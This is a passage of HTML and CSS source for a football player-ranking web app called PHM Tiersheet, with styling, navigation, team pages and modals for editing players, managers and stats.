.asub{font-size:11px;color:var(--gray);text-align:center;margin-bottom:22px;}
.aerr2{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#f87171;padding:8px 13px;border-radius:8px;font-size:11px;margin-bottom:10px;display:none;}
.aerr2.show{display:block;}
.aok{background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3);color:#34d399;padding:8px 13px;border-radius:8px;font-size:11px;margin-bottom:10px;display:none;}
.aok.show{display:block;}
.af{margin-bottom:11px;}
.albl{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:2px;color:var(--gray);text-transform:uppercase;display:block;margin-bottom:4px;}
.ainp{width:100%;background:var(--card);border:1px solid var(--border2);border-radius:9px;padding:10px 13px;color:var(--white);font-family:'Barlow',sans-serif;font-size:13px;outline:none;transition:all .2s;}
.ainp:focus{border-color:var(--blue3);background:var(--card2);}
.abtn2{width:100%;font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:800;letter-spacing:4px;text-transform:uppercase;background:var(--blue);color:var(--white);border:none;padding:13px;border-radius:9px;cursor:pointer;margin-top:14px;transition:all .2s;box-shadow:0 0 20px var(--blueglow);touch-action:manipulation;}
.abtn2:hover,.abtn2:active{background:var(--blue3);transform:translateY(-1px);}
.abtn2:disabled{opacity:.5;cursor:not-allowed;transform:none;}
.aswitch{text-align:center;margin-top:13px;font-size:11px;color:var(--gray);}
.aswitch a{color:var(--blue3);cursor:pointer;}
.aswitch a:hover{text-decoration:underline;}
/* Verify step */
.verify-code-wrap{display:flex;gap:8px;align-items:center;margin-bottom:12px;}
.verify-code-wrap .ainp{letter-spacing:8px;font-size:18px;font-family:'Orbitron',monospace;text-align:center;}
.resend-row{display:flex;justify-content:space-between;align-items:center;margin-top:10px;gap:8px;}
.resend-btn{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;background:rgba(30,111,255,.12);border:1px solid rgba(30,111,255,.35);color:var(--blue3);cursor:pointer;padding:8px 16px;border-radius:8px;transition:all .2s;touch-action:manipulation;min-height:34px;}
.resend-btn:hover:not(:disabled),.resend-btn:active:not(:disabled){background:var(--blue);color:#fff;border-color:var(--blue);}
.resend-btn:disabled{color:var(--gray2);cursor:not-allowed;background:rgba(255,255,255,.03);border-color:var(--border2);}
.resend-countdown{font-family:'Orbitron',monospace;font-size:10px;color:var(--gray);letter-spacing:1px;flex-shrink:0;}

/* ── TOAST ── */
.toast{position:fixed;bottom:22px;right:18px;background:var(--card2);border:1px solid var(--border);border-radius:12px;padding:11px 15px;display:flex;align-items:center;gap:9px;font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:700;letter-spacing:1px;z-index:600;transform:translateX(130%);transition:transform .4s cubic-bezier(.34,1.56,.64,1);max-width:270px;box-shadow:0 16px 40px rgba(0,0,0,.5);}
@media(max-width:380px){.toast{left:14px;right:14px;max-width:none;bottom:14px;transform:translateY(120%);} .toast.show{transform:translateY(0);}}
.toast.show{transform:translateX(0);}
.tok{border-left:3px solid #34d399;}
.ter{border-left:3px solid #f87171;}
.tico{font-size:13px;font-weight:900;flex-shrink:0;}

/* ── EMPTY STATE ── */
.empty{text-align:center;padding:44px 20px;color:var(--gray);}
.empty .eico{width:40px;height:40px;margin:0 auto 12px;opacity:.25;}
.empty .eico svg{width:100%;height:100%;stroke:var(--blue3);fill:none;stroke-width:1.5;}
.empty h3{font-family:'Barlow Condensed',sans-serif;font-size:17px;font-weight:700;letter-spacing:2px;margin-bottom:6px;color:var(--white);}
.empty p{font-size:12px;line-height:1.6;}

/* ── TEAMS ── */
.team-card{background:var(--card);border:1px solid var(--border2);border-radius:16px;padding:0;cursor:pointer;transition:all .25s;position:relative;overflow:hidden;display:flex;flex-direction:column;}
.team-card-banner{height:5px;width:100%;flex-shrink:0;}
.team-card-body{padding:16px 14px 14px;display:flex;flex-direction:column;align-items:center;gap:0;flex:1;}
.team-card:hover{border-color:var(--blue);transform:translateY(-3px);box-shadow:0 14px 40px rgba(30,111,255,.2);}
.team-logo-img{width:52px;height:52px;object-fit:contain;margin:0 auto 10px;display:block;}
.team-card-name{font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:800;letter-spacing:.5px;color:var(--white);margin-bottom:2px;text-align:center;line-height:1.2;}
.team-card-city{font-size:9px;color:var(--gray);letter-spacing:1px;margin-bottom:8px;text-transform:uppercase;}
.team-card-footer{display:flex;align-items:center;gap:6px;flex-wrap:wrap;justify-content:center;}
.team-card-badge{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:1.5px;padding:2px 8px;border-radius:20px;background:var(--bluesoft);color:var(--blue3);border:1px solid var(--border);display:inline-flex;align-items:center;gap:4px;}
.team-card-mgr{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:1px;padding:2px 8px;border-radius:20px;background:rgba(139,92,246,.1);color:#a78bfa;border:1px solid rgba(139,92,246,.2);display:inline-flex;align-items:center;gap:3px;}
/* Team modal */
.team-mod-header{position:relative;overflow:hidden;}
.team-mod-color-bar{height:6px;width:100%;}
.team-mod-top{display:flex;align-items:center;gap:18px;padding:22px 22px 16px;}
.team-mod-logo{width:72px;height:72px;object-fit:contain;flex-shrink:0;filter:drop-shadow(0 4px 16px rgba(0,0,0,.4));}
.team-mod-info{flex:1;min-width:0;}
.team-mod-name{font-family:'Barlow Condensed',sans-serif;font-size:24px;font-weight:900;letter-spacing:2px;color:var(--white);line-height:1;margin-bottom:4px;}
.team-mod-sub{font-size:11px;color:var(--gray);letter-spacing:1px;margin-bottom:10px;}
.team-stats-row{display:flex;gap:10px;flex-wrap:wrap;}
.tstat{display:flex;flex-direction:column;align-items:center;background:rgba(255,255,255,.04);border:1px solid var(--border2);border-radius:8px;padding:6px 14px;min-width:54px;}
.tstat-n{font-family:'Orbitron',monospace;font-size:17px;font-weight:900;color:var(--blue3);line-height:1;}
.tstat-l{font-family:'Barlow Condensed',sans-serif;font-size:8px;color:var(--gray);letter-spacing:2px;text-transform:uppercase;margin-top:2px;}
.team-manager-bar{display:flex;align-items:center;gap:10px;padding:10px 22px;background:rgba(139,92,246,.06);border-top:1px solid rgba(139,92,246,.12);border-bottom:1px solid var(--border2);}
.team-mgr-label{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:2px;color:#a78bfa;text-transform:uppercase;}
.team-mgr-name{font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:800;color:var(--white);letter-spacing:.5px;}
/* Player rows in team modal */
.tp-row{display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid var(--border2);transition:background .2s;border-radius:8px;padding:10px 8px;margin:0 -8px;}
.tp-row:last-child{border-bottom:none;}
.tp-row:hover{background:rgba(255,255,255,.03);}
.tp-ava{width:38px;height:38px;border-radius:50%;background:var(--bg3);border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;font-family:'Barlow Condensed',sans-serif;font-size:15px;font-weight:800;overflow:hidden;flex-shrink:0;}
.tp-ava img{width:100%;height:100%;object-fit:cover;}
.tp-info{flex:1;min-width:0;}
.tp-name{font-family:'Barlow Condensed',sans-serif;font-size:15px;font-weight:800;color:var(--white);letter-spacing:.3px;}
.tp-pos{font-size:10px;color:var(--gray);letter-spacing:.5px;margin-top:1px;}
.tp-tier{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:2px;padding:2px 8px;border-radius:20px;flex-shrink:0;}
.tp-rat{font-family:'Orbitron',monospace;font-size:20px;font-weight:900;color:var(--blue3);flex-shrink:0;min-width:36px;text-align:right;}
/* Team name pill on tiersheet */
.team-pill{display:inline-flex;align-items:center;gap:4px;background:rgba(30,111,255,.08);border:1px solid rgba(30,111,255,.15);border-radius:20px;padding:1px 6px;font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:.5px;color:var(--blue3);pointer-events:none;margin-top:3px;}
.team-pill img{width:12px;height:12px;object-fit:contain;}

/* FIFA-style stat hexagon mini stats on player card */
.pc-stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:3px 6px;margin-top:8px;pointer-events:none;}
.pc-stat{display:flex;flex-direction:column;align-items:center;gap:1px;}
.pc-stat-n{font-family:'Orbitron',monospace;font-size:10px;font-weight:900;color:var(--white);line-height:1;}
.pc-stat-l{font-family:'Barlow Condensed',sans-serif;font-size:7px;font-weight:700;letter-spacing:1px;color:var(--gray);text-transform:uppercase;}

/* Enhanced player modal / detail overlay */
.pdet-mod{background:var(--bg2);border:1px solid var(--border);border-radius:20px;width:100%;max-width:640px;overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,.7);animation:mi .3s ease;margin:auto;}
.pdet-banner{height:6px;width:100%;}
.pdet-header{display:flex;align-items:flex-start;gap:16px;padding:22px 22px 16px;background:linear-gradient(135deg,var(--bg1),var(--bg));}
.pdet-ava{width:90px;height:90px;border-radius:50%;background:var(--bg3);border:3px solid var(--blue);overflow:hidden;display:flex;align-items:center;justify-content:center;box-shadow:0 0 28px var(--blueglow);flex-shrink:0;}
.pdet-ava img{width:100%;height:100%;object-fit:cover;}
.pdet-info{flex:1;min-width:0;}
.pdet-name{font-family:'Barlow Condensed',sans-serif;font-size:26px;font-weight:900;letter-spacing:1.5px;color:var(--white);line-height:1;margin-bottom:4px;}
.pdet-meta{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px;}
.pdet-ovr{font-family:'Orbitron',monospace;font-size:52px;font-weight:900;color:var(--blue3);line-height:1;text-shadow:0 0 24px var(--blueglow);min-width:70px;text-align:center;flex-shrink:0;}
.pdet-body{padding:0 22px 22px;}
.pdet-section{margin-bottom:20px;}
.pdet-section-title{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:800;letter-spacing:3px;color:var(--blue3);text-transform:uppercase;margin-bottom:12px;padding-bottom:6px;border-bottom:1px solid var(--border2);}
.pdet-bio{font-size:12px;color:var(--gray);line-height:1.7;font-style:italic;background:var(--card);border-radius:10px;padding:12px 14px;border-left:3px solid var(--blue);}
.pdet-kv-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;}
@media(max-width:480px){.pdet-kv-grid{grid-template-columns:1fr;}}
.pdet-kv{background:var(--card);border:1px solid var(--border2);border-radius:10px;padding:10px 14px;display:flex;flex-direction:column;gap:2px;}
.pdet-kv-label{font-family:'Barlow Condensed',sans-serif;font-size:8px;font-weight:700;letter-spacing:2.5px;color:var(--gray);text-transform:uppercase;}
.pdet-kv-val{font-family:'Barlow Condensed',sans-serif;font-size:16px;font-weight:800;color:var(--white);letter-spacing:.5px;}
.pdet-kv-val.big{font-family:'Orbitron',monospace;font-size:22px;font-weight:900;color:var(--blue3);}
/* FIFA attribute bars */
.fifa-attrs{display:grid;grid-template-columns:1fr 1fr;gap:6px 24px;}
@media(max-width:480px){.fifa-attrs{grid-template-columns:1fr;}}
.fifa-attr{display:flex;align-items:center;gap:8px;}
.fifa-attr-lbl{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:1.5px;color:var(--gray);text-transform:uppercase;width:62px;flex-shrink:0;}
.fifa-attr-bar{flex:1;height:5px;background:var(--bg3);border-radius:3px;overflow:hidden;}
.fifa-attr-fill{height:100%;border-radius:3px;transition:width 1s ease;}
.fifa-attr-val{font-family:'Orbitron',monospace;font-size:11px;font-weight:900;width:26px;text-align:right;flex-shrink:0;}
/* reset stats modal */
.rstats-mod{background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:24px;width:100%;max-width:440px;animation:mi .3s ease;margin:auto;}

/* Best Player badge */
.best-player-badge{display:inline-flex;align-items:center;gap:4px;background:linear-gradient(135deg,rgba(245,166,35,.2),rgba(245,166,35,.08));border:1px solid rgba(245,166,35,.4);border-radius:20px;padding:3px 10px;font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:800;letter-spacing:2px;color:#fbbf24;text-transform:uppercase;}
.team-pill img{width:12px;height:12px;object-fit:contain;}

/* ── SCROLLBAR ── */
::-webkit-scrollbar{width:4px;height:4px;}
::-webkit-scrollbar-track{background:transparent;}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
::-webkit-scrollbar-thumb:hover{background:var(--blue2);}

/* ── RESPONSIVE NAV ── */
@media(max-width:460px){
  .nav{padding:0 11px;height:54px;}
  .ntab{font-size:10px;padding:6px 8px;letter-spacing:1px;}
  .bsmall{font-size:10px;padding:6px 11px;}
  .nbrand-txt h1{font-size:10px;letter-spacing:2px;}
}
@media(max-width:340px){
  .ntabs{display:none;}
}
</style>
</head>
<body>

<!-- PHM SVG LOGO (inline, always works) -->
<svg style="display:none" id="phm-svg-def">
  <symbol id="phm-icon" viewBox="0 0 100 100">
    <defs>
      <linearGradient id="lg1" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" style="stop-color:#4d8fff"/>
        <stop offset="100%" style="stop-color:#1e6fff"/>
      </linearGradient>
      <linearGradient id="lg2" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" style="stop-color:#f0f4ff"/>
        <stop offset="100%" style="stop-color:#9bb0c9"/>
      </linearGradient>
    </defs>
    <!-- Shield outline -->
    <path d="M50 6 L88 20 L88 52 C88 72 70 88 50 94 C30 88 12 72 12 52 L12 20 Z" fill="url(#lg1)" opacity="0.9"/>
    <path d="M50 12 L83 24 L83 52 C83 69 67 83 50 88 C33 83 17 69 17 52 L17 24 Z" fill="#070d1a" opacity="0.7"/>
    <path d="M50 18 L78 29 L78 51 C78 65 65 77 50 82 C35 77 22 65 22 51 L22 29 Z" fill="url(#lg1)" opacity="0.25"/>
    <!-- P H M letters -->
    <text x="50" y="62" text-anchor="middle" font-family="'Barlow Condensed',sans-serif" font-weight="900" font-size="26" letter-spacing="1" fill="url(#lg2)">PHM</text>
    <!-- Top accent line -->
    <line x1="30" y1="38" x2="70" y2="38" stroke="#4d8fff" stroke-width="1.5" opacity="0.5"/>
  </symbol>
</svg>

<!-- SPLASH -->
<div id="splash" class="screen active">
  <div class="sbg"></div>
  <div class="sc">
    <div class="splash-logo-wrap">
      <div class="splash-logo-ring"></div>
      <div class="splash-logo-ring2"></div>
      <div class="splash-logo-glow"></div>
      <div class="splash-logo" id="splash-logo-circle">
        <img id="splash-img" alt="PHM" style="width:100%;height:100%;object-fit:cover;display:block;border-radius:50%;">
      </div>
    </div>
    <h1 class="stitle">PHM</h1>
    <p class="ssub">The Ultimate Player Tiersheet</p>
    <button class="btn-enter" onclick="goLoad()">ENTER TIERSHEET</button>
  </div>
</div>

<!-- LOADING -->
<div id="loading" class="screen">
  <div class="sbg"></div>
  <div class="load-inner">
    <div class="load-logo-wrap">
      <div class="load-glow"></div>
      <div class="load-ring2"></div>
      <div class="load-ring"></div>
      <div class="load-logo" id="load-logo-circle">
        <img id="load-img" alt="PHM" style="width:100%;height:100%;object-fit:cover;display:block;border-radius:50%;">
      </div>
    </div>
    <div class="load-title">PHM</div>
    <div class="load-sub">LOADING PROFESSIONAL DATA...</div>
    <div class="ltrack"><div class="lfill" id="lf"></div></div>
    <div class="load-pct" id="lpct">0%</div>
  </div>
</div>

<!-- APP -->
<div id="app" class="screen" style="flex-direction:column;">
  <nav class="nav">
    <div class="nbrand">
      <div class="nav-logo" id="nav-logo-circle">
        <img id="nav-img" alt="PHM" style="width:100%;height:100%;object-fit:cover;display:block;border-radius:50%;">
      </div>
      <div class="nbrand-txt">
        <h1>PHM TIERSHEET</h1>
        <p>Professional Rankings</p>
      </div>
    </div>
    <div class="ntabs">
      <button class="ntab on" onclick="goPage('tiersheet',this)">Tiersheet</button>
      <button class="ntab" onclick="goPage('analytics',this)">Analytics</button>
      <button class="ntab" onclick="goPage('teams',this)">Teams</button>
      <button class="ntab" id="mtab" style="display:none" onclick="goPage('members',this)">Members</button>
    </div>
    <div class="nright" id="nright">
      <button class="bsmall boutline" onclick="openAuth('login')">Sign In</button>
      <button class="bsmall bprimary" onclick="openAuth('register')">Register</button>
    </div>
  </nav>

  <div style="flex:1;overflow-y:auto;overflow-x:hidden;">

    <!-- TIERSHEET PAGE -->
    <div id="page-tiersheet" class="page on">
      <div class="page-hero">
        <div class="page-hero-top">
          <div>
            <h2>PHM Professional Tiersheet</h2>
            <p>Registered players ranked by tier &amp; performance</p>
          </div>
          <span class="hero-badge" id="season-badge"></span>
        </div>
      </div>
      <div class="srow">
        <div class="sbox">
          <div class="sbox-icon"><svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg></div>
          <div class="sn" id="st-p">0</div><div class="sl">Players</div>
        </div>
        <div class="sbox">
          <div class="sbox-icon"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></div>
          <div class="sn" id="st-s">0</div><div class="sl">Showing</div>
        </div>
        <div class="sbox">
          <div class="sbox-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4m0 4h.01"/></svg></div>
          <div class="sn" id="st-g">0</div><div class="sl">Goals</div>
        </div>
        <div class="sbox">
          <div class="sbox-icon"><svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
          <div class="sn" id="st-m">0</div><div class="sl">Members</div>
        </div>
      </div>
      <div id="fan-area"></div>
      <div class="ctrls">
        <div class="swrap">
          <span class="sico"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></span>
          <input type="text" placeholder="Search players…" id="srch" oninput="doFilter()">
        </div>
        <select class="fsel" id="f-tier" onchange="doFilter()">
          <option value="">All Tiers</option>
          <option>Tier 1</option><option>Tier 2</option><option>Tier 3</option><option>Tier 4</option>
        </select>
        <select class="fsel" id="f-nation" onchange="doFilter()">
          <option value="">All Nations</option>
        </select>
        <button class="brefresh" onclick="refreshAll()">&#8635; Refresh</button>
      </div>
      <div class="twrap" id="twrap"></div>
    </div>

    <!-- ANALYTICS PAGE -->
    <div id="page-analytics" class="page">
      <div class="page-hero">
        <h2>Analytics</h2>
        <p>Player performance &amp; league statistics</p>
      </div>
      <div class="awrap">
        <div class="asec-title">League Overview</div>
        <div class="agrid">
          <div class="acard"><div class="act">Nation Distribution</div><div class="nbars" id="nbars"></div></div>
          <div class="acard">
            <div class="stabs">
              <button class="stab on" onclick="setST('goals',this)">Top Scorers</button>
              <button class="stab" onclick="setST('assists',this)">Top Assists</button>
            </div>
            <ul class="slist" id="slist"></ul>
          </div>
        </div>
        <div class="mvps">
          <div class="mvph"><div class="mvpb"></div><h3>Most Valuable Players</h3></div>
          <div class="mvpr" id="mvpr"></div>
        </div>
      </div>
    </div>

    <!-- MEMBERS PAGE (admin) -->
    <div id="page-members" class="page">
      <div class="page-hero">
        <h2>Member Management</h2>
        <p>Manage roles, tiers &amp; player profiles</p>
      </div>
      <div class="mwrap">
        <div class="mtable">
          <div class="mth">
            <div class="mthc">User</div>
            <div class="mthc">Role</div>
            <div class="mthc">Tier</div>
            <div class="mthc">Last Edited</div>
            <div class="mthc" style="text-align:right">Actions</div>
          </div>
          <div id="mrows"></div>
        </div>
      </div>
    </div>

    <!-- TEAMS PAGE -->
    <div id="page-teams" class="page">
      <div class="page-hero">
        <div class="page-hero-top">
          <div>
            <h2>La Liga Teams</h2>
            <p>All 8 clubs · 2024/25 Season</p>
          </div>
          <span class="hero-badge">🇪🇸 La Liga</span>
        </div>
      </div>
      <div style="padding:16px 20px 48px;">
        <div id="teams-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:14px;"></div>
      </div>
    </div>

  </div>
</div>

<!-- TEAM PROFILE MODAL -->
<div class="ov" id="team-ov" onclick="closeTeam(event)">
  <div class="std-mod" onclick="event.stopPropagation()" style="max-width:600px;padding:0;overflow:hidden;">
    <div class="team-mod-header">
      <div class="team-mod-color-bar" id="team-color-bar"></div>
      <div class="team-mod-top">
        <img id="team-logo" class="team-mod-logo" src="" alt="">
        <div class="team-mod-info">
          <div class="team-mod-name" id="team-name"></div>
          <div class="team-mod-sub" id="team-sub"></div>
          <div class="team-stats-row" id="team-stats-row"></div>
        </div>
        <div class="cbtn" onclick="closeTeam()" style="align-self:flex-start;flex-shrink:0;">&#10005;</div>
      </div>
      <!-- Manager bar -->
      <div class="team-manager-bar" id="team-manager-bar">
        <span class="team-mgr-label">⚽ Manager</span>
        <span class="team-mgr-name" id="team-mgr-name">Not set</span>
        <span id="team-mgr-edit" style="display:none;margin-left:auto;">
          <button onclick="openSetManager(currentTeamId)" style="font-family:'Barlow Condensed',sans-serif;font-size:10px;font-weight:700;letter-spacing:1px;padding:4px 10px;border-radius:6px;border:1px solid rgba(139,92,246,.3);background:rgba(139,92,246,.1);color:#a78bfa;cursor:pointer;">Edit</button>
        </span>
      </div>
    </div>
    <!-- Players -->
    <div style="padding:18px 22px 24px;max-height:50vh;overflow-y:auto;">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
        <div style="font-family:'Barlow Condensed',sans-serif;font-size:10px;font-weight:700;letter-spacing:3px;color:var(--blue3);text-transform:uppercase;">Squad</div>
        <div id="team-squad-admin" style="display:none;">
          <button onclick="openAssignPlayer(currentTeamId)" style="font-family:'Barlow Condensed',sans-serif;font-size:10px;font-weight:700;letter-spacing:1px;padding:5px 12px;border-radius:8px;border:1px solid rgba(30,111,255,.3);background:var(--bluesoft);color:var(--blue3);cursor:pointer;">+ Add Player</button>
        </div>
      </div>
      <div id="team-players"></div>
    </div>
  </div>
</div>

<!-- SET MANAGER MODAL -->
<div class="ov" id="mgr-ov" onclick="if(!event||event.target===this)this.classList.remove('open')">
  <div class="std-mod" onclick="event.stopPropagation()" style="max-width:360px;">
    <div class="mod-title">
      <span>⚽ Set Manager</span>
      <div class="cbtn" onclick="document.getElementById('mgr-ov').classList.remove('open')">&#10005;</div>
    </div>
    <div class="fg" style="margin-bottom:18px;">
      <label class="flbl">Manager Name</label>
      <input class="finp" id="mgr-input" placeholder="e.g. Carlo Ancelotti" maxlength="50" autocomplete="off"
        onkeydown="if(event.key==='Enter')saveManager()">
    </div>
    <div class="mod-acts">
      <button class="fcancel" onclick="document.getElementById('mgr-ov').classList.remove('open')">Cancel</button>
      <button class="fsave" onclick="saveManager()">Save</button>
    </div>
  </div>
</div>

<!-- ASSIGN PLAYER MODAL -->
<div class="ov" id="assign-ov" onclick="if(!event||event.target===this)this.classList.remove('open')">
  <div class="std-mod" onclick="event.stopPropagation()" style="max-width:400px;">
    <div class="mod-title">
      <span>➕ Add Player to Team</span>
      <div class="cbtn" onclick="document.getElementById('assign-ov').classList.remove('open')">&#10005;</div>
    </div>
    <div class="fg" style="margin-bottom:8px;">
      <label class="flbl">Select Player</label>
      <select class="finp" id="assign-player-select" style="font-size:13px;"></select>
    </div>
    <div id="assign-preview" style="margin-bottom:16px;"></div>
    <div class="mod-acts">
      <button class="fcancel" onclick="document.getElementById('assign-ov').classList.remove('open')">Cancel</button>
      <button class="fsave" onclick="saveAssignPlayer()">Add to Team</button>
    </div>
  </div>
</div>

<!-- PLAYER DETAIL OVERLAY (new FIFA-style) -->
<div class="ov" id="pdet-ov" onclick="closePDet(event)">
  <div class="pdet-mod" onclick="event.stopPropagation()">
    <div class="pdet-banner" id="pdet-banner"></div>
    <div class="pdet-header">
      <div class="pdet-ava" id="pdet-ava"></div>
      <div class="pdet-info">
        <div class="pdet-name" id="pdet-name"></div>
        <div class="pdet-meta" id="pdet-meta"></div>
        <div id="pdet-bio-short" style="font-size:11px;color:var(--gray);font-style:italic;max-width:280px;line-height:1.5;margin-top:4px;"></div>
      </div>
      <div class="pdet-ovr" id="pdet-ovr"></div>
      <div class="cbtn" onclick="closePDet()" style="align-self:flex-start;margin-left:8px;flex-shrink:0;">&#10005;</div>
    </div>
    <div class="pdet-body">
      <!-- Stats row -->
      <div class="pdet-section">
        <div class="pdet-section-title">Match Stats</div>
        <div class="pdet-kv-grid" id="pdet-kvgrid"></div>
      </div>
      <!-- FIFA attrs -->
      <div class="pdet-section">
        <div class="pdet-section-title">Attributes</div>
        <div class="fifa-attrs" id="pdet-attrs"></div>
      </div>
      <!-- Bio full -->
      <div class="pdet-section" id="pdet-bio-wrap" style="display:none;">
        <div class="pdet-section-title">About</div>
        <div class="pdet-bio" id="pdet-bio-full"></div>
      </div>
      <!-- Admin actions -->
      <div id="pdet-admin-acts" style="display:none;margin-top:4px;display:flex;gap:8px;flex-wrap:wrap;"></div>
    </div>
  </div>
</div>

<!-- RESET STATS MODAL -->
<div class="ov" id="rstats-ov" onclick="closeRStatsModal(event)">
  <div class="rstats-mod" onclick="event.stopPropagation()">
    <div class="mod-title">
      <span style="color:#fbbf24;">⚠️ Reset All Stats</span>
      <div class="cbtn" onclick="closeRStatsModal()">&#10005;</div>
    </div>
    <div style="background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.25);border-radius:12px;padding:14px 16px;margin-bottom:18px;">
      <div style="font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:800;color:#fbbf24;letter-spacing:1px;margin-bottom:6px;">RESET PLAYER STATS ONLY</div>
      <div style="font-size:12px;color:rgba(251,191,36,.8);line-height:1.7;">
        This will reset <strong style="color:#fde68a;">Goals, Assists</strong> and all <strong style="color:#fde68a;">Attribute ratings</strong> for every player to default values. User accounts, tiers, teams and profiles are kept intact.<br>
        <span style="font-size:10px;opacity:.7;">This cannot be undone.</span>
      </div>
    </div>
    <div class="fg" style="margin-bottom:16px;">
      <label class="flbl" style="color:#fbbf24;">Type <strong style="color:#fde68a;letter-spacing:2px;">RESET</strong> to confirm</label>
      <input class="finp" id="rstats-confirm-input" type="text" placeholder="RESET" autocomplete="off"
        style="font-family:'Orbitron',monospace;font-size:14px;letter-spacing:4px;text-align:center;border-color:rgba(245,158,11,.3);"
        oninput="checkRStatsInput()">
    </div>
    <div class="mod-acts">
      <button class="fcancel" onclick="closeRStatsModal()">Cancel</button>
      <button id="rstats-confirm-btn" onclick="executeResetStats()" disabled
        style="font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:9px 18px;border-radius:8px;cursor:not-allowed;background:rgba(245,158,11,.2);color:rgba(251,191,36,.4);border:1px solid rgba(245,158,11,.2);transition:all .3s;min-height:38px;">
        RESET STATS
      </button>
    </div>
  </div>
</div>

<!-- HEATMAP OVERLAY -->
<div class="ov" id="hov" onclick="closeHM(event)">
  <div class="hmod" onclick="event.stopPropagation()">
    <div class="hmleft">
      <div class="hmava" id="hmava"></div>
      <div style="text-align:center;width:100%;">
        <div class="hmname" id="hmname"></div>
        <div class="hmtier" id="hmtier"></div>
        <div class="hmpos" id="hmpos"></div>
        <div id="hmteam" style="display:none;align-items:center;font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:1px;color:var(--gray);margin-bottom:6px;"></div>
        <div class="hmrat" id="hmrat"></div>
        <div class="hmval" id="hmval"></div>
        <div class="hmbio" id="hmbio"></div>
      </div>
    </div>
    <div class="hmright">
      <div class="hmhead">
        <div class="hmtitle">PERFORMANCE</div>
        <div class="cbtn" onclick="closeHM()">&#10005;</div>
      </div>
      <div id="hmbars"></div>
    </div>
  </div>
</div>

<!-- EDIT OVERLAY -->
<div class="ov" id="eov" onclick="closeEdit(event)">
  <div class="std-mod" onclick="event.stopPropagation()">
    <div class="mod-title">
      <span id="etitle-txt">Edit Player</span>
      <div class="cbtn" onclick="closeEdit()">&#10005;</div>
    </div>
    <input type="hidden" id="eu-id">
    <div class="fgrid">
      <div class="fg"><label class="flbl">Tier</label>
        <select class="finp" id="ep-tier"><option>Tier 1</option><option>Tier 2</option><option>Tier 3</option><option>Tier 4</option></select></div>
      <div class="fg"><label class="flbl">Nation</label><input class="finp" id="ep-nat" placeholder="ENG" maxlength="4"></div>
      <div class="fg"><label class="flbl">Value (M)</label><input class="finp" id="ep-val" type="number" min="0" step="0.1" placeholder="0.0"></div>
      <div class="fg"><label class="flbl">Goals</label><input class="finp" id="ep-gls" type="number" min="0" placeholder="0"></div>
      <div class="fg"><label class="flbl">Assists</label><input class="finp" id="ep-ast" type="number" min="0" placeholder="0"></div>
      <div class="fg full"><label class="flbl">Avatar URL</label><input class="finp" id="ep-ava" placeholder="https://..." maxlength="300"></div>
      <div class="fg"><label class="flbl">Position</label><input class="finp" id="ep-pos" placeholder="e.g. ST, CAM, GK" maxlength="20"></div>
      <div class="fg full"><label class="flbl">La Liga Team</label>
        <select class="finp" id="ep-team">
          <option value="">— No Team —</option>
          <option value="atleti">Atlético Madrid</option>
          <option value="barca">FC Barcelona</option>
          <option value="osasuna">CA Osasuna</option>
          <option value="girona">Girona FC</option>
          <option value="athletic">Athletic Bilbao</option>
          <option value="real">Real Madrid</option>
          <option value="betis">Real Betis</option>
          <option value="villar">Villarreal CF</option>
        </select>
      </div>
      <div class="fg full"><label class="flbl">Bio / Description</label><textarea class="finp" id="ep-bio" placeholder="Tell your story... achievements, playstyle, career highlights..." maxlength="300" rows="3" style="resize:vertical;min-height:70px;font-family:inherit;font-size:13px;"></textarea></div>
    </div>
    <div class="stats-label">Performance Stats</div>
    <div id="esliders"></div>
    <div class="mod-acts">
      <button class="fcancel" onclick="closeEdit()">Cancel</button>
      <button class="fsave" onclick="saveEdit()">Save Changes</button>
    </div>
  </div>
</div>

<!-- PROMOTE OVERLAY -->
